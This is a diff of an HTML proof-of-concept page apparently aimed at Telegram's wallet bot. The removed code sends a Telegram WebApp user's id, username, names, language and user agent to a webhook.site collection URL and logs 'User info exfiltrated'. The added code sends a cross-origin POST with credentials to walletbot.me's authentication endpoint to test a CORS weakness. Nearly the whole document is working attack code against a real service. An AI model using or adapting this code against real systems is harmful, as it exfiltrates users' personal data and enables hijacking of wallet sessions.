@@ -1,36 +1,26 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Telegram Wallet Injection Test</title>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
+  <title>CORS PoC</title>
 </head>
 <body>
-  <h2>🧪 Exploit running...</h2>
-  <p>This PoC opens Telegram Wallet and injects wallet logic using postMessage.</p>
-
+  <h1>CORS PoC Test</h1>
   <script>
-window.Telegram.WebApp.ready();
-
-const user = window.Telegram.WebApp.initDataUnsafe?.user;
-if (user) {
-  fetch("https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      telegram_id: user.id,
-      username: user.username,
-      first_name: user.first_name,
-      last_name: user.last_name,
-      lang: user.language_code,
-      ua: navigator.userAgent,
-      source: "Telegram Bot WebApp"
+    fetch("https://walletbot.me/api/v1/users/auth/", {
+      method: "POST",
+      credentials: "include",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        web_view_init_data_raw: "YOUR_WEB_VIEW_INIT_DATA_RAW",
+        ep: "settings"
+      })
     })
-  });
-  console.log("✅ User info exfiltrated");
-} else {
-  console.warn("⚠️ No user info found");
-}
-
+    .then(res => res.text())
+    .then(data => console.log("✅ Response:", data))
+    .catch(err => console.error("❌ Error:", err));
   </script>
 </body>
 </html>
